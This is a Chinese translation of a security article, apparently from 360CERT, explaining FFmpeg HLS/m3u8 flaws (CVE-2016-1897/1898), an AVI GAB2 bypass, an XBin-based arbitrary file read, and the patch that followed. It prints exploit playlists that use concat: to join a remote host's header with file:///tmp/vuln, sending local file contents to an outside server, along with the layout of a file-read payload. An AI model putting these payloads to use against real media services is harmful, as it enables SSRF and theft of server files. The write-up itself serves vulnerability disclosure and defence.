# 【技术分享】FFmpeg安全问题探讨（含演示视频）

##### 译文声明
本文为翻译文章，原文来源：blogs.360.cn。具体内容及含义请以原文为准。

在2016年的BlackHat大会上，有报告指出视频服务中存在的漏洞。研究人员继续深入研究这一领域，并将在本次讨论中介绍一些新的逻辑和二进制漏洞，以及它们的利用方法。同时，我们还将分享在漏洞赏金计划中发现这些漏洞的真实案例！

6月27日，HackerOne公开了一份关于FFmpeg本地文件泄露的报告（[链接](https://hackerone.com/reports/243470)）。这份报告与25日发布的另一份相关报告（[链接](https://hackerone.com/reports/242831)）有关。Emil Lerner 和 Pavel Cheremushkin 在今年的 PHDays 大会上已经披露了这些漏洞（[幻灯片链接](https://www.slideshare.net/phdays/ss-76515896)）。360CERT团队迅速跟进此安全问题，并将简要预警一个尚未公开的FFmpeg命令执行漏洞。

## FFmpeg背景知识与工作流程
FFmpeg是一个功能强大且广泛应用的多媒体框架，支持解码、编码、转码及播放几乎所有格式的多媒体文件。其基本工作流程如下：
- 原始封装视频 -> demux分离器分离视频资源 -> 获取音频和视频资源 -> 解码 -> 得到解压缩后的音视频资源 -> 经过滤器编辑处理 -> 得到处理后的音视频资源 -> 编码得到转码后的音视频资源 -> 使用mux混合器进行封装 -> 最终生成转码封装后的视频

尽管FFmpeg非常强大，但正是由于它对多种格式的强大适应能力，加上流媒体协议的多样性，可能会导致意想不到的安全威胁。

## HLS简介
流媒体协议大致可分为两类：一种是通过HTTP渐进式下载（如HLS、Flash渐进式），另一种则是RTSP形式的实时流媒体协议。HLS（HTTP Live Streaming）由Apple提出并推广，它会将整个视频流分成多个基于HTTP的小文件来下载，每次下载一部分，并将视频流元数据存放在m3u8文件中。

m3u8本身并不是视频文件，而是一个配置文件，指定应播放的视频资源。实际播放的视频资源通常是下载下来的ts文件。例如：
```plaintext
#EXTM3U
#EXT-X-MEDIA-SEQUENCE
#EXT-X-TARGETDURATION
#EXT-X-ALLOW-CACHE
#EXT-X-ENDLIST
#EXTINF
redrain.ts
```

当然，该视频资源也可以指向远程地址：
```plaintext
#EXTM3U
#EXT-X-MEDIA-SEQUENCE
#EXT-X-TARGETDURATION
#EXT-X-ALLOW-CACHE
#EXT-X-ENDLIST
#EXTINF
http://www.redrain.sb/test.mp4
```

## 知识点回顾
去年发现了CVE-2016-1897和CVE-2016-1898两个漏洞，分别涉及SSRF和服务端请求伪造以及任意文件读取。其中，SSRF利用了m3u8可以访问远程资源的特性。此外，FFmpeg支持物理级拼接协议concat:，可将多个URL流合并访问资源：
```plaintext
concat:URL1|URL2|…|URLN
```
结合SSRF，我们可以读取file://的内容并发送出去：
```plaintext
#EXTM3U
#EXT-X-TARGETDURATION:6
#EXTINF:10.0,
concat:http://rr.sb/poc/header.m3u8|file:///tmp/vuln
#EXT-X-ENDLIST
```
该漏洞已在FFmpeg 2.8.5版本中修复。

## 新老漏洞对比
上个月，在PHDays大会上，通过一种视频格式技巧绕过了厂商对SSRF的防护措施。在AVI视频中，有一种定义字幕的数据块GAB2位于AVI头部。有趣的是，m3u8可以插入AVI文件中，而FFmpeg仍会对带有#EXTM3U头的AVI视频进行HLS处理。因此，可以通过嵌入m3u8绕过对CVE-2016-1898的修复：
```plaintext
[AVI header GAB2 header]
#EXTM3U
#EXT-X-TARGETDURATION:6
#EXTINF:10.0,
concat:http://rr.sb/poc/header.m3u8|file:///tmp/vuln
#EXT-X-ENDLIST
[AVI body footer]
```

## 新型任意文件读取漏洞
Emil Lerner 和 Pavel Cheremushkin 在会议上还披露了其他几个FFmpeg漏洞，其中一个特别有趣的漏洞是通过读取文件内容输出到视频中，即使在网络环境下也能被利用。利用思路如下：
- 将m3u8嵌入到带有GAB2的AVI视频中，绕过文件格式检查。
- m3u8需要包含可播放的视频资源，这里使用XBin格式，它具有显示图片和文本的基本功能，并且体积小且可编程。
- 将目标文件作为对象嵌入XBin格式中，绘制为字符后，可以作为合法的视频文件观看。文件结构如下：
  ```plaintext
  [AVI header]
  [GAB2 header]
  [m3u8 header]
  [XBIN header]
  目标文件
  [XBIN footer]
  [m3u8 footer]
  [AVI footer]
  ```
- 为了绕过FFmpeg对非法字符串的检查，可以使用AES-128 CBC模式加密m3u8内容：
  ```plaintext
  #EXT-X-KEY:METHOD=AES-128, URI=/dev/zero, IV=
  #EXT-X-BYTERANGE: 16
  /dev/zero
  ```

最终，我们得到的文件结构如下：
  ```plaintext
  [AVI header]
  [GAB2 header]
  [m3u8 header]
  {loop}
  #EXT-X-KEY:METHOD=AES-128, URI=/dev/zero, IV=   // 声明m3u8的AES加密，将XBin部分加密
  [XBIN header]     被加密
  目标文件
  [XBIN footer]    被加密
  {loop}
  [m3u8 footer]
  [AVI footer]
  ```

执行后，读取的目标文件内容成功输出在ffplay播放器中。

## 官方修复
针对该漏洞的补丁主要限制了允许的文件扩展名：
```c
+    {"allowed_extensions", "List of file extensions that hls is allowed to access",
+        OFFSET(allowed_extensions), AV_OPT_TYPE_STRING,
+        {.str = "3gp,aac,avi,flac,mkv,m3u8,m4a,m4s,m4v,mpg,mov,mp2,mp3,mp4,mpeg,mpegts,ogg,ogv,oga,ts,vob,wav"},
+        INT_MIN, INT_MAX, FLAGS},
```
打上补丁后，只允许上述扩展名的文件访问。

## 任意代码执行
在PHDays大会的PPT中提到：
```plaintext
FFmpeg is one of those projects we trust to have RCE everywhere.
```
这句话确实得到了验证。笔者在分析该漏洞和ImageMagick命令执行漏洞后，对格式处理和媒体处理软件的安全性产生了浓厚兴趣。进一步研究发现，在处理MOV视频过程中也存在嵌入数据的命令执行漏洞，但在最新版本中暂时未复现。

## 思考
FFmpeg作为目前最广泛的多媒体框架之一，其强大之处不言而喻。然而，正因为它支持多种媒体格式，包括一些古老或特殊的标准协议，可能带来不同的安全风险。缺乏沙箱设计可能会带来更多利用的可能性，未来的媒体处理服务组件或软件可能会暴露出更多问题。

**参考来源**
- [HackerOne 报告](https://hackerone.com/reports/243470)
- [PHDays 幻灯片](https://www.slideshare.net/phdays/ss-76515896)